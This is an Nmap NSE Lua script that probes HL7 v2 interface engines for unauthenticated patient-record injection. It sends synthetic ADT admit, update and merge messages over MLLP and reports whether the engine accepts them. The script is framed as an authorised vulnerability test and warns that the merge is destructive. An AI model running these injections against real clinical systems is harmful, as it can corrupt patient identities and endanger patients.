local shortport = require "shortport"
local stdnse = require "stdnse"
local nmap = require "nmap"
local hl7 = require "hl7"

description = [[
Tests whether an HL7 v2 interface engine accepts unauthenticated ADT
(admit/discharge/transfer) messages - i.e. whether an attacker who can reach
the MLLP port can inject, alter or merge patient records.

ADT is the patient-identity feed that populates the master patient index and
every downstream system. An engine that acknowledges an inbound ADT from any
client lets an attacker register a fictitious patient (A01), overwrite an
existing patient's demographics (A08), or merge one patient record into another
(A40) - all of which drive patient misidentification and wrong-patient events.

This script sends clearly-synthetic ADT messages (processing ID T, an obviously
fake patient) and reports whether the engine accepted them (MSA|AA), rejected
them (MSA|AE/AR), or failed to respond.

This is a HIGHLY INTRUSIVE test: on a real system it writes patient-identity
messages into the interface, and the A40 merge in particular can be
destructive. Only run it against systems you are explicitly authorised to test,
in a lab or a controlled maintenance window.
]]

---
-- @usage
-- nmap -p2575 --script hl7-adt-inject <target>
-- @usage
-- nmap -p2575 --script hl7-adt-inject --script-args
--   hl7-adt-inject.mode=merge,hl7-adt-inject.patient_id=PAT001,hl7-adt-inject.prior_id=PAT002 <target>
--
-- @output
-- PORT     STATE SERVICE
-- 2575/tcp open  hl7
-- | hl7-adt-inject:
-- |   Admit  (ADT^A01): ACCEPTED - MSA|AA
-- |   Update (ADT^A08): ACCEPTED - MSA|AA
-- |   Merge  (ADT^A40): ACCEPTED - MSA|AA
-- |   VULNERABILITY: Engine accepted unauthenticated ADT (patient) injection
-- |_    An attacker with TCP access can create, alter or merge patient records
--
-- @args hl7-adt-inject.mode         "admit", "update", "merge" or "all".
--                                   Default: all
-- @args hl7-adt-inject.patient_id   Patient identifier (PID-3). Default:
--                                   synthetic
-- @args hl7-adt-inject.patient_name Patient name (PID-5). Default: ZZZTEST
-- @args hl7-adt-inject.prior_id     Prior patient id (MRG-1) for merge
-- @args hl7-adt-inject.sending_app  Sending Application (MSH-3). Default: NMAP
-- @args hl7-adt-inject.timeout      Response timeout in seconds. Default: 8
-- @args hl7-adt-inject.tls          "true" for MLLP over TLS. Default: false
---

author = "Paulino Calderon <paulino@calderonpale.com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive"}

portrule = shortport.port_or_service({2575, 2576}, "hl7", "tcp", "open")

local function arg(name, default)
  return stdnse.get_script_args("hl7-adt-inject." .. name) or default
end

--- Send one message and classify acceptance.
local function inject(host, port, msg, timeout_s, tls)
  local ok, resp = hl7.transact(host, port, msg, timeout_s, tls)
  if not ok then
    return "NO-RESPONSE", tostring(resp)
  end
  local info = hl7.parse_response(resp)
  local code = info.ack_code
  if code == "AA" or code == "CA" then
    return "ACCEPTED", "MSA|" .. code
  elseif code == "AE" or code == "CE" or code == "AR" or code == "CR" then
    return "REJECTED", "MSA|" .. code
  end
  if hl7.find_segment(info.segments, "MSH") then
    return "REJECTED", "reply without a positive MSA"
  end
  return "NO-RESPONSE", "unparseable reply"
end

action = function(host, port)
  local out = stdnse.output_table()
  local mode = arg("mode", "all"):lower()
  local timeout_s = tonumber(arg("timeout", "8"))
  local tls = arg("tls", "false") == "true"
  local base = {
    patient_id = arg("patient_id", "ZZZTEST"),
    patient_name = arg("patient_name", "ZZZTEST^NMAP"),
    sending_app = arg("sending_app", "NMAP"),
    processing_id = "T",
  }

  local tests = {}
  if mode == "admit" or mode == "all" then
    tests[#tests + 1] = { "A01", "Admit  (ADT^A01)" }
  end
  if mode == "update" or mode == "all" then
    tests[#tests + 1] = { "A08", "Update (ADT^A08)" }
  end
  if mode == "merge" or mode == "all" then
    tests[#tests + 1] = { "A40", "Merge  (ADT^A40)" }
  end

  local any_accepted = false
  for _, t in ipairs(tests) do
    local opts = {
      patient_id = base.patient_id, patient_name = base.patient_name,
      sending_app = base.sending_app, processing_id = base.processing_id,
      prior_id = arg("prior_id", "ZZZOLD"),
    }
    local msg = hl7.build_adt(t[1], opts)
    local class, detail = inject(host, port, msg, timeout_s, tls)
    out[t[2]] = class .. " - " .. detail
    if class == "ACCEPTED" then any_accepted = true end
  end

  if any_accepted then
    out["VULNERABILITY"] =
      "Engine accepted unauthenticated ADT (patient) injection"
    out["Impact"] =
      "An attacker with TCP access can create, alter or merge patient records"
    nmap.set_port_version(host, port, "hardmatched")
  else
    out["Note"] = "No ADT injection accepted (engine rejected or no response)"
  end
  return out
end
